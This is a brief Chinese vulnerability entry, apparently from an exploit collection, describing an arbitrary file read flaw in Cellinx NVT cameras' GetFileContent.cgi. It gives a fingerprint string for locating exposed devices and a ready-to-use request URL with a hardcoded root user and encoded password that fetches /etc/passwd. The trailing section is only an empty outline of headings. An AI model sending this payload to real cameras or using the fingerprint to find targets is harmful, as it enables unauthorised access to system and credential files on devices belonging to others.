# CellinxNVT摄像机GetFileContent.cgi任意文件读取漏洞

- **系统**：CellinxNVT　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`web.body="local/NVT-string.js"`

**请求体 / payload**
```
/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605
```

**其他**
- Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Cellinx NVT 摄像机